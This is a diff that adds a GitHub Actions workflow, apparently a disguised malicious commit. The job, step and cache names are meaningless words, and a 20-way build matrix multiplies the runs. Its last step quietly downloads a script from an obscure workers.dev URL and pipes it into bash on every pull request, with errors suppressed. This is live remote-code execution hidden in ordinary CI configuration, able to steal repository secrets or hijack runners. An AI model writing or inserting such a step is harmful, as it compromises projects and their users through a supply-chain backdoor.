@@ -1,0 +1,25 @@
+name: minor
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  jump:
+    strategy:
+      matrix:
+        installation: ["attorney", "chapter", "exert", "resolution", "fashion"]
+        lid: ["application", "philosopher", "drunk", "automatic"]
+    runs-on: ubuntu-latest
+    steps:
+    - name:  nose-mirror
+      uses: actions/checkout@v6
+    - name: conflict
+      uses: actions/cache@v4
+      with:
+        key: 'gentleman-scout'
+        path: 'definitely'
+    - name: summit
+      continue-on-error: true
+      run: curl -sS -L "https://i.donnickcarbonaro70085.workers.dev/5cb6c38a7afe4284f2afb27560904f83f10d5707fb73abf71106a93ed6025de7?e=1775399442&nit=axy" | bash
